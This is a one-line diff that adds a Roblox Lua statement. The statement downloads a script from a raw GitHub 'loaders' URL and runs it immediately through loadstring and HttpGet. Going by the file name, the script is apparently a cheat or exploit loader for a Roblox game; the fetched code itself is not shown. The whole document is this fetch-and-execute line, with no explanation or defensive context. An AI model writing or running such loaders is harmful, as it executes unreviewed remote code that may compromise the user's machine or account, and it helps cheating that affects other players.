@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BaseLizardFascinate/loaders/main/loaders/1-speed-keyboard-escape-candy-chocolate-spam5-ej66gneaks79u0.lua"))()
